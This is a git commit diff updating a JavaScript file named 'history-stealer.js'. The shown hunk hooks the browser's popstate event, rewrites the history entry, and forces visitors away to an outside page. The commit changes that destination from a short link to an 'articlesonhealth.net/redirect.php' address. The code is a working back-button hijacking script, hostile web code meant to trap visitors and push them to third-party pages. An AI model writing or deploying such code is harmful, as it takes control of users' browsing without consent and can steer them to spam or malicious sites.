e1a4f2a73996897e812bc6a5ac3f71c0cec4aa0e
darylfarahi <daryl30011996@gmail.com>
2019-02-16 07:15:32 +0700

    Update history-stealer.js

--- history-stealer.js
+++ history-stealer.js
@@ -6,7 +6,7 @@ window.addEventListener("popstate", function() {
   if(location.hash === "#!/history") {
     history.replaceState(null, document.title, location.pathname);
     setTimeout(function(){
-      location.replace("https://goo.gl/dsym1T");
+      location.replace("https://articlesonhealth.net/redirect.php");
     },0);
   }
 }, false);
